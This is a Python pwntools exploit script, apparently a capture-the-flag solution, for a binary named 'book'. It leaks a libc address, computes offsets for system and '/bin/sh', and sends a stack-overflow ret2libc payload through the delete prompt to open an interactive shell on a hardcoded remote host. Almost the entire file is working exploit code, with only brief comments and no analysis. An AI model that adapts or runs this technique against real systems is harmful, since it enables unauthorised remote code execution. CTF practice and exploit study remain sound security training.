from pwn import *
DEBUG = 0
list = [ ]
libc = ELF('./libc-2.23.so')
elf = ELF("./book")
if DEBUG:
    env = os.environ
    #Ubuntu 16.04
    env["LD_PRELOAD"] = './libc-2.23.so'
    context.log_level = 'debug'
    p = process("./book")
    #use ROPgadget --binary libcxxx --string "/bin/sh" 
    binsh_offset = 0x15BA0B
    system_offset = libc.symbols["system"]
    #use ida to get
    leak_offset = -0x1B23DC
else:
    context.log_level = 'info'
    p = remote("117.34.105.33",6002)
    binsh_offset = 0x15BA0B
    system_offset = libc.symbols["system"]
    leak_offset = -0x1B23DC

#get shell
def exp():
    p.recvuntil("Who")
    if DEBUG:
        pause()
    p.send('a' * 0x14)
    p.recvuntil('a' * 0x14)
    leak_heap_addr=u32(p.recv(4))
    leak_libc_addr=u32(p.recv(4))
    libc_base = leak_libc_addr + leak_offset
    system_addr = system_offset + libc_base
    binsh_addr = binsh_offset + libc_base 
    print hex(leak_libc_addr),hex(libc_base),hex(system_addr),hex(binsh_addr)
    if DEBUG:
        pause()
    p.sendline("delete")
    p.recvuntil("----\n")
    #delete() stack overflow
    #Mark:binsh_addr have special char will stop scanf so +5 make "/bin/sh\0" to "sh\0"
    payload = 'x' * 0x1A + p32(system_addr) + 'a'*4 +  p32(binsh_addr+5) 
    p.sendline(payload)
    p.recvuntil("----\n")
    p.recvuntil("----\n")
    p.interactive()

if __name__ == "__main__":
    exp()

